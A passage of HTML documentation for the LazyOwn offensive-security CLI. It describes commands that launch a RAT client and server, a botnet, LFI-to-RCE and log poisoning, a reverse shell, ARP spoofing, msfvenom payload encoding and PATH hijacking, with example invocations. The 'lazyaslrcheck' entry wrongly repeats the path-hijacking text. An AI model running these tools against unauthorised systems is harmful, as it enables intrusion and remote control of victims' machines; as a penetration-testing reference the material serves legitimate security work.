<li><code>rat_key</code>: The RAT key, specified in
<code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>lhost</code>, <code>lport</code>, and
<code>rat_key</code> from <code>self.params</code>.</li>
<li>Checks if all required parameters (<code>lhost</code>,
<code>lport</code>, and <code>rat_key</code>) are set. If any are
missing, it prints an error message and returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazyownclient.py</code> script with the appropriate
arguments.</li>
</ol>
<p>:param lhost: The IP address of the local host. :type lhost: str
:param lport: The port number of the local host. :type lport: int :param
rat_key: The RAT key. :type rat_key: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>lhost</code>,
<code>lport</code>, and <code>rat_key</code> are set in
<code>self.params</code>. 2. The script
<code>modules/lazyownclient.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazyownclient.py --host &lt;lhost&gt; --port &lt;lport&gt; --key &lt;rat_key&gt;</code></p>
<p>Example: To run <code>lazyownclient</code> with <code>lhost</code>
set to <code>192.168.1.10</code>, <code>lport</code> set to
<code>8080</code>, and <code>rat_key</code> set to
<code>my_secret_key</code>, set:
<code>self.params["lhost"] = "192.168.1.10"</code>
<code>self.params["lport"] = 8080</code>
<code>self.params["rat_key"] = "my_secret_key"</code> Then call:
<code>run_lazyownratcli()</code></p>
<p>Note: - Ensure that <code>modules/lazyownclient.py</code> has the
appropriate permissions and dependencies to run.</p>
<h2 id="lazyownrat">lazyownrat</h2>
<p>Run the internal module located at
<code>modules/lazyownserver.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>rhost</code>: The IP address of the remote host, specified in
<code>self.params</code>.</li>
<li><code>rport</code>: The port number of the remote host, specified in
<code>self.params</code>.</li>
<li><code>rat_key</code>: The RAT key, specified in
<code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>rhost</code>, <code>rport</code>, and
<code>rat_key</code> from <code>self.params</code>.</li>
<li>Checks if all required parameters (<code>rhost</code>,
<code>rport</code>, and <code>rat_key</code>) are set. If any are
missing, it prints an error message and returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazyownserver.py</code> script with the appropriate
arguments.</li>
</ol>
<p>:param rhost: The IP address of the remote host. :type rhost: str
:param rport: The port number of the remote host. :type rport: int
:param rat_key: The RAT key. :type rat_key: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rhost</code>,
<code>rport</code>, and <code>rat_key</code> are set in
<code>self.params</code>. 2. The script
<code>modules/lazyownserver.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazyownserver.py --host &lt;rhost&gt; --port &lt;rport&gt; --key &lt;rat_key&gt;</code></p>
<p>Example: To run <code>lazyownserver</code> with <code>rhost</code>
set to <code>192.168.1.10</code>, <code>rport</code> set to
<code>8080</code>, and <code>rat_key</code> set to
<code>my_secret_key</code>, set:
<code>self.params["rhost"] = "192.168.1.10"</code>
<code>self.params["rport"] = 8080</code>
<code>self.params["rat_key"] = "my_secret_key"</code> Then call:
<code>run_lazyownrat()</code></p>
<p>Note: - Ensure that <code>modules/lazyownserver.py</code> has the
appropriate permissions and dependencies to run.</p>
<h2 id="lazybotnet">lazybotnet</h2>
<p>Run the internal module located at <code>modules/lazybotnet.py</code>
with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>rhost</code>: The IP address of the remote host, hardcoded to
“0.0.0.0”.</li>
<li><code>rport</code>: The port number of the remote host, specified in
<code>self.params</code>.</li>
<li><code>rat_key</code>: The RAT key, specified in
<code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>rport</code> and <code>rat_key</code>
from <code>self.params</code>. The <code>rhost</code> is hardcoded to
“0.0.0.0”.</li>
<li>Checks if all required parameters (<code>rport</code> and
<code>rat_key</code>) are set. If any are missing, it prints an error
message and returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazybotnet.py</code> script with the appropriate arguments.</li>
</ol>
<p>:param rport: The port number of the remote host. :type rport: int
:param rat_key: The RAT key. :type rat_key: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rport</code> and
<code>rat_key</code> are set in <code>self.params</code>. 2. The script
<code>modules/lazybotnet.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazybotnet.py --host &lt;rhost&gt; --port &lt;rport&gt; --key &lt;rat_key&gt;</code></p>
<p>Example: To run <code>lazybotnet</code> with <code>rport</code> set
to <code>1234</code> and <code>rat_key</code> set to
<code>my_key</code>, set: <code>self.params["rport"] = 1234</code>
<code>self.params["rat_key"] = "my_key"</code> Then call:
<code>run_lazybotnet()</code></p>
<p>Note: - Ensure that <code>modules/lazybotnet.py</code> has the
appropriate permissions and dependencies to run.</p>
<h2 id="lazylfi2rce">lazylfi2rce</h2>
<p>Run the internal module located at
<code>modules/lazylfi2rce.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>rhost</code>: The IP address of the remote host, specified in
<code>self.params</code>.</li>
<li><code>rport</code>: The port number of the remote host, specified in
<code>self.params</code>.</li>
<li><code>lhost</code>: The IP address of the local host, specified in
<code>self.params</code>.</li>
<li><code>lport</code>: The port number of the local host, specified in
<code>self.params</code>.</li>
<li><code>field</code>: The field name for the LFI (Local File
Inclusion) attack, specified in <code>self.params</code>.</li>
<li><code>wordlist</code>: The path to the wordlist file used for the
attack, specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>rhost</code>, <code>rport</code>,
<code>lhost</code>, <code>lport</code>, <code>field</code>, and
<code>wordlist</code> from <code>self.params</code>.</li>
<li>Checks if all required parameters are set. If any are missing, it
prints an error message and returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazylfi2rce.py</code> script with the appropriate arguments.</li>
</ol>
<p>:param rhost: The IP address of the remote host. :type rhost: str
:param rport: The port number of the remote host. :type rport: int
:param lhost: The IP address of the local host. :type lhost: str :param
lport: The port number of the local host. :type lport: int :param field:
The field name for the LFI attack. :type field: str :param wordlist: The
path to the wordlist file. :type wordlist: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rhost</code>,
<code>rport</code>, <code>lhost</code>, <code>lport</code>,
<code>field</code>, and <code>wordlist</code> are set in
<code>self.params</code>. 2. The script
<code>modules/lazylfi2rce.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazylfi2rce.py --rhost &lt;rhost&gt; --rport &lt;rport&gt; --lhost &lt;lhost&gt; --lport &lt;lport&gt; --field &lt;field&gt; --wordlist &lt;wordlist&gt;</code></p>
<p>Example: To run the lazylfi2rce with <code>rhost</code> set to
<code>192.168.1.1</code>, <code>rport</code> set to <code>80</code>,
<code>lhost</code> set to <code>192.168.1.2</code>, <code>lport</code>
set to <code>8080</code>, <code>field</code> set to <code>file</code>,
and <code>wordlist</code> set to <code>path/to/wordlist.txt</code>, set:
<code>self.params["rhost"] = "192.168.1.1"</code>
<code>self.params["rport"] = 80</code>
<code>self.params["lhost"] = "192.168.1.2"</code>
<code>self.params["lport"] = 8080</code>
<code>self.params["field"] = "file"</code>
<code>self.params["wordlist"] = "path/to/wordlist.txt"</code> Then call:
<code>run_lazylfi2rce()</code></p>
<p>Note: - Ensure that <code>modules/lazylfi2rce.py</code> has the
appropriate permissions and dependencies to run.</p>
<h2 id="lazylogpoisoning">lazylogpoisoning</h2>
<p>Run the internal module located at
<code>modules/lazylogpoisoning.py</code> with the specified
parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>rhost</code>: The IP address of the remote host, specified in
<code>self.params</code>.</li>
<li><code>lhost</code>: The IP address of the local host, specified in
<code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>rhost</code> and <code>lhost</code>
from <code>self.params</code>.</li>
<li>Checks if the required parameters <code>rhost</code> and
<code>lhost</code> are set. If not, it prints an error message and
returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazylogpoisoning.py</code> script with the appropriate
arguments.</li>
</ol>
<p>:param rhost: The IP address of the remote host. Must be set in
<code>self.params</code>. :type rhost: str :param lhost: The IP address
of the local host. Must be set in <code>self.params</code>. :type lhost:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rhost</code> and
<code>lhost</code> are set in <code>self.params</code>. 2. The script
<code>modules/lazylogpoisoning.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazylogpoisoning.py --rhost &lt;rhost&gt; --lhost &lt;lhost&gt;</code></p>
<p>Example: To run the lazylogpoisoning with <code>rhost</code> set to
<code>192.168.1.1</code> and <code>lhost</code> set to
<code>192.168.1.2</code>, set:
<code>self.params["rhost"] = "192.168.1.1"</code>
<code>self.params["lhost"] = "192.168.1.2"</code> Then call:
<code>run_lazylogpoisoning()</code></p>
<p>Note: - Ensure that <code>modules/lazylogpoisoning.py</code> has the
appropriate permissions and dependencies to run.</p>
<h2 id="lazybotcli">lazybotcli</h2>
<p>Run the internal module located at <code>modules/lazybotcli.py</code>
with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>rhost</code>: The IP address of the remote host (default is
<code>"0.0.0.0"</code>).</li>
<li><code>rport</code>: The port number to be used, specified in
<code>self.params</code>.</li>
<li><code>rat_key</code>: The key for the Remote Access Tool (RAT),
specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>rport</code> and <code>rat_key</code>
from <code>self.params</code>.</li>
<li>Checks if the required parameters <code>rport</code> and
<code>rat_key</code> are set. If not, it prints an error message and
returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazybotcli.py</code> script with the appropriate arguments.</li>
</ol>
<p>:param rport: The port number for the connection. Must be set in
<code>self.params</code>. :type rport: int :param rat_key: The key for
the RAT. Must be set in <code>self.params</code>. :type rat_key: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rport</code> and
<code>rat_key</code> are set in <code>self.params</code>. 2. The script
<code>modules/lazybotcli.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazybotcli.py --host 0.0.0.0 --port &lt;rport&gt; --key &lt;rat_key&gt;</code></p>
<p>Example: To run the lazybotcli with port <code>12345</code> and key
<code>mysecretkey</code>, set: <code>self.params["rport"] = 12345</code>
<code>self.params["rat_key"] = "mysecretkey"</code> Then call:
<code>run_lazybotcli()</code></p>
<p>Note: - Ensure that <code>modules/lazybotcli.py</code> has the
appropriate permissions and dependencies to run.</p>
<h2 id="lazyssh77enum">lazyssh77enum</h2>
<p>Run the internal module located at
<code>modules/lazybrutesshuserenum.py</code> with the specified
parameters. ONLY valid for 7.x Version !!!</p>
<p>The script will be executed with the following arguments:</p>
<ul>
<li><code>wordlist</code>: The path to the wordlist file containing
potential usernames for SSH enumeration.</li>
<li><code>rhost</code>: The target IP address or hostname for SSH
enumeration.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>wordlist</code> and
<code>rhost</code> from <code>self.params</code>.</li>
<li>Prints a warning message about the potential inaccuracy of the
results.</li>
<li>Constructs the command to run the
<code>lazybrutesshuserenum.sh</code> script with the specified
arguments.</li>
<li>Executes the command using the <code>os.system</code> method.</li>
</ol>
<p>:param wordlist: The path to the wordlist file for username
enumeration. Must be set in <code>self.params</code>. :type wordlist:
str :param rhost: The target IP address or hostname for SSH enumeration.
Must be set in <code>self.params</code>. :type rhost: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>wordlist</code> and
<code>rhost</code> are set in <code>self.params</code>. 2. Run the
script <code>modules/lazybrutesshuserenum.sh</code> with the appropriate
arguments.</p>
<p>Dependencies: - <code>modules/lazybrutesshuserenum.sh</code> must be
present in the <code>modules</code> directory and must be
executable.</p>
<p>Example: To run the SSH user enumeration with a wordlist located at
<code>/path/to/wordlist.txt</code> and target IP
<code>192.168.1.1</code>, set:
<code>self.params["usrwordlist"] = "/path/to/wordlist.txt"</code>
<code>self.params["rhost"] = "192.168.1.1"</code> Then call:
<code>run_lazyssh77enum()</code></p>
<p>Note: - The accuracy of the results may vary depending on the version
of the script and the wordlist used.</p>
<h2 id="lazyburpfuzzer">lazyburpfuzzer</h2>
<p>Run the internal module located at
<code>modules/lazyown_burpfuzzer.py</code> with the specified
parameters.</p>
<p>The script will be executed with the following arguments:</p>
<ul>
<li><code>--url</code>: The target URL for the fuzzer.</li>
<li><code>--method</code>: The HTTP method to use (e.g., GET,
POST).</li>
<li><code>--proxy_port</code>: The port for the proxy server.</li>
<li><code>--headers</code>: Optional HTTP headers to include in the
request.</li>
<li><code>--data</code>: Optional data to include in the request
body.</li>
<li><code>--params</code>: Optional URL parameters to include in the
request.</li>
<li><code>--json_data</code>: Optional JSON data to include in the
request body.</li>
<li><code>-w</code>: Optional wordlist for fuzzing.</li>
<li><code>-hc</code>: Optional hide code for fuzzing.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>url</code>, <code>method</code>,
<code>headers</code>, <code>params</code>, <code>data</code>,
<code>json_data</code>, <code>proxy_port</code>, <code>wordlist</code>,
and <code>hide_code</code> from <code>self.params</code>.</li>
<li>Constructs the command to run the <code>lazyown_burpfuzzer.py</code>
script with the specified arguments.</li>
<li>Adds optional parameters based on whether the corresponding files
(<code>headers_file</code>, <code>data_file</code>,
<code>params_file</code>, <code>json_data_file</code>) are
provided.</li>
<li>Executes the command using the <code>run_command</code> method.</li>
</ol>
<p>:param url: The target URL for the fuzzer. Must be set in
<code>self.params</code>. :type url: str :param method: The HTTP method
to use. Must be set in <code>self.params</code>. :type method: str
:param headers: Optional HTTP headers. Must be set in
<code>self.params</code> or provided via <code>headers_file</code>.
:type headers: str :param params: Optional URL parameters. Must be set
in <code>self.params</code> or provided via <code>params_file</code>.
:type params: str :param data: Optional data for the request body. Must
be set in <code>self.params</code> or provided via
<code>data_file</code>. :type data: str :param json_data: Optional JSON
data for the request body. Must be set in <code>self.params</code> or
provided via <code>json_data_file</code>. :type json_data: str :param
proxy_port: The port for the proxy server. Must be set in
<code>self.params</code>. :type proxy_port: int :param wordlist:
Optional wordlist for fuzzing. Must be set in <code>self.params</code>.
:type wordlist: str :param hide_code: Optional code to hide. Must be set
in <code>self.params</code>. :type hide_code: int :param headers_file:
Optional file containing headers. :type headers_file: str, optional
:param data_file: Optional file containing data. :type data_file: str,
optional :param params_file: Optional file containing parameters. :type
params_file: str, optional :param json_data_file: Optional file
containing JSON data. :type json_data_file: str, optional</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>url</code>,
<code>method</code>, and <code>proxy_port</code> are set in
<code>self.params</code>. 2. Provide additional parameters as needed. 3.
Run the script <code>modules/lazyown_burpfuzzer.py</code> with the
appropriate arguments.</p>
<p>Dependencies: - <code>modules/lazyown_burpfuzzer.py</code> must be
present in the <code>modules</code> directory and must be
executable.</p>
<p>Example: To run the fuzzer with URL <code>http://example.com</code>,
HTTP method <code>POST</code>, and proxy port <code>8080</code>, set:
<code>self.params["url"] = "http://example.com"</code>
<code>self.params["method"] = "POST"</code>
<code>self.params["proxy_port"] = 8080</code> Then call:
<code>run_lazyburpfuzzer()</code></p>
<p>Note: - Ensure that all required parameters are set before calling
this function. - Parameters can also be provided via corresponding
files.</p>
<h2 id="lazyreverse_shell">lazyreverse_shell</h2>
<p>Run the internal module located at
<code>modules/lazyreverse_shell.sh</code> with the specified
parameters.</p>
<p>The script will be executed with the following arguments: -
<code>--ip</code>: The IP address to use for the reverse shell. -
<code>--puerto</code>: The port to use for the reverse shell.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>rhost</code> (IP address) and
<code>reverse_shell_port</code> (port) from
<code>self.params</code>.</li>
<li>Validates that <code>rhost</code> and
<code>reverse_shell_port</code> parameters are set.</li>
<li>Constructs the command to run the <code>lazyreverse_shell.sh</code>
script with the specified arguments.</li>
<li>Executes the command.</li>
</ol>
<p>:param ip: The IP address to use for the reverse shell. Must be set
in <code>self.params</code>. :type ip: str :param port: The port to use
for the reverse shell. Must be set in <code>self.params</code>. :type
port: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rhost</code> and
<code>reverse_shell_port</code> are set in <code>self.params</code>. 2.
Run the script <code>modules/lazyreverse_shell.sh</code> with the
appropriate arguments.</p>
<p>Dependencies: - <code>modules/lazyreverse_shell.sh</code> must be
present in the <code>modules</code> directory and must be
executable.</p>
<p>Example: To set up a reverse shell with IP <code>192.168.1.100</code>
and port <code>4444</code>, set:
<code>self.params["rhost"] = "192.168.1.100"</code>
<code>self.params["reverse_shell_port"] = "4444"</code> Then call:
<code>run_lazyreverse_shell()</code></p>
<p>Note: - Ensure that <code>modules/lazyreverse_shell.sh</code> has the
necessary permissions to execute. - Parameters must be set before
calling this function.</p>
<h2 id="lazyarpspoofing">lazyarpspoofing</h2>
<p>Run the internal module located at
<code>modules/lazyarpspoofing.py</code> with the specified
parameters.</p>
<p>The script will be executed with the following arguments: -
<code>--device</code>: The network interface to use for ARP spoofing. -
<code>lhost</code>: The local host IP address to spoof. -
<code>rhost</code>: The remote host IP address to spoof.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>lhost</code>, <code>rhost</code>, and
<code>device</code> from <code>self.params</code>.</li>
<li>Validates that <code>lhost</code>, <code>rhost</code>, and
<code>device</code> parameters are set.</li>
<li>Constructs the command to run the <code>lazyarpspoofing.py</code>
script with the specified arguments.</li>
<li>Executes the command.</li>
</ol>
<p>:param lhost: The local host IP address to spoof. Must be set in
<code>self.params</code>. :type lhost: str :param rhost: The remote host
IP address to spoof. Must be set in <code>self.params</code>. :type
rhost: str :param device: The network interface to use for ARP spoofing.
Must be set in <code>self.params</code>. :type device: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>lhost</code>,
<code>rhost</code>, and <code>device</code> are set in
<code>self.params</code>. 2. Run the script
<code>modules/lazyarpspoofing.py</code> with the appropriate
arguments.</p>
<p>Dependencies: - <code>modules/lazyarpspoofing.py</code> must be
present in the <code>modules</code> directory and must be
executable.</p>
<p>Example: To execute ARP spoofing with local host
<code>192.168.1.2</code>, remote host <code>192.168.1.1</code>, and
device <code>eth0</code>, set:
<code>self.params["lhost"] = "192.168.1.2"</code>
<code>self.params["rhost"] = "192.168.1.1"</code>
<code>self.params["device"] = "eth0"</code> Then call:
<code>run_lazyarpspoofing()</code></p>
<p>Note: - Ensure that <code>modules/lazyarpspoofing.py</code> has the
necessary permissions to execute. - Parameters must be set before
calling this function.</p>
<h2 id="lazyattack">lazyattack</h2>
<p>Run the internal module located at <code>modules/lazyatack.sh</code>
with the specified parameters.</p>
<p>The script will be executed with the following arguments: -
<code>--modo</code>: The mode of the attack. - <code>--ip</code>: The
target IP address. - <code>--atacante</code>: The attacker IP
address.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the current working directory.</li>
<li>Validates that <code>mode</code>, <code>rhost</code>, and
<code>lhost</code> parameters are set.</li>
<li>Constructs the command to run the <code>lazyatack.sh</code> script
with the specified arguments.</li>
<li>Executes the command.</li>
</ol>
<p>:param mode: The mode in which the attack should be run. Must be set
in <code>self.params</code>. :type mode: str :param target_ip: The IP
address of the target. Must be set in <code>self.params</code>. :type
target_ip: str :param attacker_ip: The IP address of the attacker. Must
be set in <code>self.params</code>. :type attacker_ip: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>mode</code>,
<code>rhost</code>, and <code>lhost</code> are set in
<code>self.params</code>. 2. Run the script
<code>modules/lazyatack.sh</code> with the appropriate arguments.</p>
<p>Dependencies: - <code>modules/lazyatack.sh</code> must be present in
the <code>modules</code> directory and must be executable.</p>
<p>Example: To execute the attack with mode <code>scan</code>, target IP
<code>192.168.1.100</code>, and attacker IP <code>192.168.1.1</code>,
set: <code>self.params["mode"] = "scan"</code>
<code>self.params["rhost"] = "192.168.1.100"</code>
<code>self.params["lhost"] = "192.168.1.1"</code> Then call:
<code>run_lazyattack()</code></p>
<p>Note: - Ensure that <code>modules/lazyatack.sh</code> has the
necessary permissions to execute. - Parameters must be set before
calling this function.</p>
<h2 id="lazymsfvenom">lazymsfvenom</h2>
<p>Runs the <code>msfvenom</code> tool to generate payloads based on
user input.</p>
<p>Prompts the user to select a payload type from a list and executes
the corresponding <code>msfvenom</code> command to generate a payload.
Moves the generated payloads to a <code>sessions</code> directory and
sets appropriate permissions. Optionally compresses the payloads using
UPX and handles a C payload with shikata_ga_nai.</p>
<p>:param line: Command line arguments for the script. :return: None</p>
<h2 id="lazyaslrcheck">lazyaslrcheck</h2>
<p>Creates a path hijacking attack by performing the following
steps:</p>
<ol type="1">
<li>Appends the value of <code>binary_name</code> to a temporary script
located at <code>modules/tmp.sh</code>.</li>
<li>Copies this temporary script to <code>/tmp</code> with the name
specified by <code>binary_name</code>.</li>
<li>Sets executable permissions on the copied script.</li>
<li>Prepends <code>/tmp</code> to the system’s PATH environment variable
to ensure the script is executed in preference to other binaries.</li>
</ol>
<p>The function then prints out each command being executed and a
message indicating the binary name used for the path hijacking.</p>
<p>:param binary_name: The name of the binary to be used in the path
hijacking attack. It should be set in <code>self.params</code> before
calling this method. :type binary_name: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>binary_name</code> is set in
<code>self.params</code>. 2. Append the binary name to
<code>modules/tmp.sh</code>. 3. Copy <code>modules/tmp.sh</code> to
<code>/tmp/{binary_name}</code>. 4. Set executable permissions on the
copied file. 5. Update the PATH environment variable to prioritize
<code>/tmp</code>.</p>
<p>Dependencies: - The <code>self.params</code> dictionary must contain
a valid <code>binary_name</code>. - Ensure that
<code>modules/tmp.sh</code> exists and contains appropriate content for
the attack.</p>
<p>Example: To execute the path hijacking attack with
<code>binary_name</code> as <code>malicious</code>, ensure
<code>self.params["binary_name"]</code> is set to
<code>"malicious"</code>, and then call:
<code>run_lazypathhijacking()</code></p>
<p>Note: - The <code>binary_name</code> parameter must be a string
representing the name of the binary to hijack. - The method modifies the
PATH environment variable, which may affect the execution of other
binaries.</p>
<h2 id="lazypathhijacking">lazypathhijacking</h2>
<p>Creates a path hijacking attack by performing the following
steps:</p>
<ol type="1">
<li>Appends the value of <code>binary_name</code> to a temporary script
located at <code>modules/tmp.sh</code>.</li>
<li>Copies this temporary script to <code>/tmp</code> with the name
specified by <code>binary_name</code>.</li>
<li>Sets executable permissions on the copied script.</li>
<li>Prepends <code>/tmp</code> to the system’s PATH environment variable
to ensure the script is executed in preference to other binaries.</li>
</ol>
<p>The function then prints out each command being executed and a
message indicating the binary name used for the path hijacking.</p>
<p>:param binary_name: The name of the binary to be used in the path
hijacking attack. :returns: None</p>
<h2 id="script">script</h2>
<p>Run a script with the given arguments</p>
<p>This method constructs and executes a command to run a Python script
with the specified arguments. It uses the <code>run_command</code>
method to execute the script and handle real-time output.</p>
<p>:param script_name: The name of the script to be executed. :type
script_name: str :param args: The arguments to be passed to the script.
:type args: tuple of str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Build the command list with “python3”, the
script name, and the arguments. 2. Call <code>run_command</code> with
the constructed command list.</p>
<p>Dependencies: - <code>run_command</code> method for executing the
constructed command and streaming output.</p>
<p>Example: To execute a script named <code>example.py</code> with
arguments <code>arg1</code> and <code>arg2</code>, call:
<code>run_script("example.py", "arg1", "arg2")</code></p>
<p>Note: - The <code>script_name</code> parameter should be a string
representing the name of the script. - The <code>args</code> parameter
is a variable-length argument list containing the arguments to be passed
to the script. - Ensure that the script and arguments are properly
specified.</p>
<h2 id="command">command</h2>
<p>Run a command and print output in real-time</p>
<p>This method executes a given command using
<code>subprocess.Popen</code> and streams both the standard output and
standard error to the console in real-time. The output from both streams
is appended to the <code>self.output</code> attribute. If interrupted,
the process is terminated gracefully.</p>
<p>:param command: The command to be executed. :type command: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Execute the command specified by the
<code>command</code> parameter. 2. Stream and print the command’s
standard output and error to the console in real-time. 3. Append all
output to the <code>self.output</code> attribute. 4. Handle
<code>KeyboardInterrupt</code> by terminating the process and printing
an error message.</p>
<p>Dependencies: - <code>subprocess</code> module for running the
command and capturing output. - <code>print_msg</code> function for
printing output to the console. - <code>print_error</code> function for
printing error messages to the console.</p>
<p>Example: To execute a command, call
<code>run_command("ls -l")</code>.</p>
<p>Note: - The <code>command</code> parameter should be a string
representing the command to be executed. - <code>self.output</code> must
be initialized before calling this method. - Ensure proper exception
handling to manage process interruptions.</p>
<h2 id="payload">payload</h2>
<p>Load parameters from payload.json</p>
<p>This function loads parameters from a JSON file named
<code>payload.json</code> and updates the instance’s <code>params</code>
dictionary with the values from the file. If the file does not exist or
contains invalid JSON, it will print an appropriate error message.</p>
<p>Usage: payload</p>
<p>:param line: This parameter is not used in this function. :type line:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Open and read the <code>payload.json</code>
file. 2. Update the <code>params</code> dictionary with values from the
JSON file. 3. Print a success message if the parameters were
successfully loaded. 4. Handle <code>FileNotFoundError</code> if the
file does not exist. 5. Handle <code>JSONDecodeError</code> if there is
an error decoding the JSON file.</p>
<p>Dependencies: - <code>json</code> module for reading and parsing the
JSON file.</p>
<p>Example: To execute the function, simply call
<code>payload</code>.</p>
<p>Note: - Ensure that <code>payload.json</code> exists in the current
directory and is properly formatted. - The confirmation message includes
color formatting for better visibility.</p>
<h2 id="exit">exit</h2>
<p>Exit the command line interface.</p>
<p>This function prompts the user to confirm whether they want to exit
the command line interface. If confirmed, it will terminate the program.
Otherwise, it will cancel the exit.</p>
<p>Usage: exit</p>
<p>:param arg: This parameter is not used in this function. :type arg:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Prompt the user with a confirmation message to
exit the CLI. 2. If the user confirms with ‘s’, print a message and exit
the program. 3. If the user provides any other input, print a
cancellation message and remain in the CLI.</p>
<p>Dependencies: - <code>sys.exit</code> function for exiting the
program.</p>
<p>Example: To execute the function, simply call <code>exit</code>.</p>
<p>Note: - The confirmation prompt is in Spanish. - Ensure that
<code>sys</code> is imported in your script.</p>
<h2 id="fixperm">fixperm</h2>
<p>Fix permissions for LazyOwn shell scripts.</p>
<p>This function adjusts the file permissions for shell scripts and CGI
scripts in the <code>modules</code> directory, making them
executable.</p>
<p>Usage: fixperm</p>
<p>:param line: This parameter is not used in this function. :type line:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Change the permissions of all shell scripts in
the <code>modules</code> directory to be executable. 2. Change the
permissions of all files in the <code>modules/cgi-bin</code> directory
to be executable.</p>
<p>Dependencies: - <code>chmod</code> command must be available on the
system.</p>
<p>Example: To execute the function, simply call
<code>fixperm</code>.</p>
<p>Note: - Ensure you have the necessary permissions to modify file
permissions.</p>
<h2 id="lazywebshell">lazywebshell</h2>
<p>Run LazyOwn webshell server.</p>
<p>This function starts a web server that serves the
<code>lazywebshell.py</code> script from the <code>modules</code>
directory on port 8888. The server is run in the background.</p>
<p>Usage: lazywebshell</p>
<p>:param line: This parameter is not used in this function. :type line:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Start a Python HTTP server with CGI support on
port 8888. 2. The server serves files from the <code>modules</code>
directory.</p>
<p>Dependencies: - Python 3.x must be installed on the system. - The
<code>http.server</code> module should be available.</p>
<p>Example: To execute the function, simply call
<code>lazywebshell</code>.</p>
<p>Note: - The server runs in the background, and the output will not be
displayed in the terminal.</p>
<h2 id="getcap">getcap</h2>
<p>Retrieve and display file capabilities on the system.</p>
<p>This function uses the <code>getcap</code> command to recursively
list capabilities for files starting from the root directory
(<code>/</code>). The output is filtered to suppress error messages.</p>
<p>Usage: getcap</p>
<p>:param line: This parameter is not used in this function. :type line:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Run the <code>getcap -r /</code> command to list
file capabilities recursively from the root directory. 2. Redirect
standard error to <code>/dev/null</code> to suppress error messages.</p>
<p>Dependencies: - <code>getcap</code> must be installed on the
system.</p>
<p>Example: To execute the function, simply call
<code>do_getcap</code>.</p>
<p>Note: - The command may require elevated permissions to access
certain directories and files.</p>
<h2 id="getseclist">getseclist</h2>
<p>Get the SecLists wordlist from GitHub.</p>
<p>This function downloads and extracts the SecLists wordlist from
GitHub to the <code>/usr/share/wordlists/</code> directory.</p>
<p>Usage: getseclist</p>
<p>:param line: This parameter is not used in this function. :type line:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Navigate to the
<code>/usr/share/wordlists/</code> directory. 2. Download the SecLists
repository using <code>wget</code>. 3. Extract the downloaded ZIP file.
4. Remove the ZIP file after extraction.</p>
<p>Dependencies: - <code>wget</code> must be installed on the system. -
<code>unzip</code> must be installed on the system. - <code>sudo</code>
must be available for downloading and extracting files.</p>
<p>Example: To execute the function, simply call
<code>getseclist</code>.</p>
<p>Note: - Ensure that you have the necessary permissions to write to
the <code>/usr/share/wordlists/</code> directory. - If <code>wget</code>
or <code>unzip</code> is not installed, the function will fail.</p>
<h2 id="smbclient">smbclient</h2>
<p>Interacts with SMB shares using the <code>smbclient</code> command to
perform the following operations:</p>
<ol type="1">
<li>Checks if <code>rhost</code> (remote host) and <code>lhost</code>
(local host) are set; if not, an error message is displayed.</li>
<li>If <code>line</code> (share name) is provided:</li>
</ol>
<ul>
<li>Attempts to access the specified SMB share on the remote host using
the command: <code>smbclient -N \\{rhost}\{line}</code></li>
</ul>
